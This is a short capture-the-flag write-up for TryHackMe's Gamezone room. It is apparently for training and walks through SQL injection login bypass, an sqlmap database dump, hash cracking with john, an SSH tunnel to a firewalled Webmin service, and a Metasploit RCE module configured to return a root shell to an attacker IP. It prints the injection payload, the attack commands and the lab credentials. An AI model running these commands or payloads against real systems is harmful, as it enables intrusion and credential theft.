# Gamezone \(W\) \(wlk\)

_TryHackMe_ – [**Gamezone**](https://tryhackme.com/room/gamezone) Write-Up

_topics_: SQL injection\(SQLmap\), password cracking, reveal services with reverse SSH tunnel, Windows privilege escalation

1. **Plan**
2. **Enumeration**
3. **Local Privilege Escalation**
4. **Vuln Scanning**
5. **Exploitation**

new tools: sqlmap,

#### USE WITHOUT METASPLOIT AND SQLMAP

## 1\) Plan

this box is a walkthrough so it is just to introduce these concepts. will understand more about SQL \(structured query language\) and how you can potentially manipulate queries to communicate with the database.

#### Enumeration – would’ve had to find out through scans this is a webserver based on SQL and attempt malicious query manipulation.

## 2\) Local PrivEsc: SQLi & Password Cracking

walkthrough so no nmap scans. The website is configured to accept “’or 1=1 – -” input as the username with a blank password, obtaining access via SQL injection \(manipulating queries to communicate with database\). This redirects to portal.php page.

Intercept POST field with burp and save to request.txt file to use wih sqlmap.

 `sqlmap -r request.txt --dbms=mysql --dump >> sql.txt (can omit --dbms)`

which returns a hashed password \(ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14\) and a username of agent47.

###  2.1\) Password cracking

 save the hash to a file john.txt and copy that to file named hashes after running john on john.txt.

 `john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=RAW-SHA256`

 returns the password of videogamer124 for the account agent47.

## 3\) Vuln Scanning – Services with reverse SSH tunnels

using the socket inspection utility `ss -t` and `ss -tulpn`, we can see how many TCP sockets are running, 5. This exposes a service running on port 10000 that is blocked via firewall \(viewable from Iptables\), can use SSH tunnel to expose the port on the attacking machine

`ssh -L 10000:localhost:10000 <username>@<ip>` exposing a vulnerable CMS website. Using the credentials **agent47:videogamer124** we can login and reveal the version number 1.580 and find an exploit.

## 4\) Root Escalation

searching for webmin 1.580 exploit reveals a metasploit RCE. Login to msfconsole

`msfconsole`

`search webmin or search 1.580`

`use <exploit> (use exploit/unix/webapp/webmin_show_cgi_exec)`

`show options`

`set PASSWORD videogamer124, set RHOSTS localhost, set RPORT 10000, set SSL false, set USERNAME agent47, set LHOSTS <attacker ip>`

`sessions -i <session ID>`

following this creates a shell with root access and we can read the flag.

\*\*\*\*

\*\*\*\*

\*\*\*\*

